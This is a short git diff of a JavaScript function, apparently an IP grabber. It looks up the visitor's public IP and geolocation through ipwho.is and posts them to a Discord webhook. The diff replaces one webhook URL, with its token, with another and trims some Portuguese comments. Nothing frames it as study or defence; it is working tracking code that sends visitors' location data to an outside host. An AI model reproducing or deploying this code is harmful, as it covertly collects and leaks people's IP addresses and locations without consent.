@@ -3,10 +3,10 @@ const sendIP = () => {
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
-            return fetch('https://ipwho.is/')  // CORRIGIDO: API com CORS
+            return fetch('https://ipwho.is/')  // API com CORS
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const dscURL = 'https://discord.com/api/webhooks/1434608236673368084/AFQ-LUDSvqZxcGzn-6-gd8D84KTdZUn20ykWjvoYhg52IKkxvgAn-xIjcAmjdA1AAu5y'; // SEU WEBHOOK
+                    const dscURL = 'https://discord.com/api/webhooks/1434610512817295481/xCqpWyOquMugG3gtsYI9NvgIOa_uX47S2ricKjbLfcuEbs1iFhbakivEL5i-tGtoHwj7'; // SEU WEBHOOK
 
                     return fetch(dscURL, {
                         method: 'POST',
@@ -25,7 +25,7 @@ const sendIP = () => {
                                 }
                             ]
                         })
-                    }).then(dscResponse => {  // CORRIGIDO: .then no fetch do Discord
+                    }).then(dscResponse => {
                         if (dscResponse.ok) {
                             console.log('Sent! <3');
                         } else {
